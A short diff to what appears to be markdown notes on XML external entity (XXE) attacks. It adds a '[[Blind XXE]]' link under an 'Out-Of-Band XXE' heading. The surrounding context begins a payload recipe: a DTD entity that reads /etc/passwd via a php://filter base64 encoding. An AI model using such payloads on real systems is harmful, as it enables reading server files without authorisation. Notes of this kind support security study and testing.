@@ -113,6 +113,7 @@ Sending this request data:
 </contact>
 ```
 ### Out-Of-Band XXE
+[[Blind XXE]]
 1. Create xxe.dtd file:
 ```xml
 <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
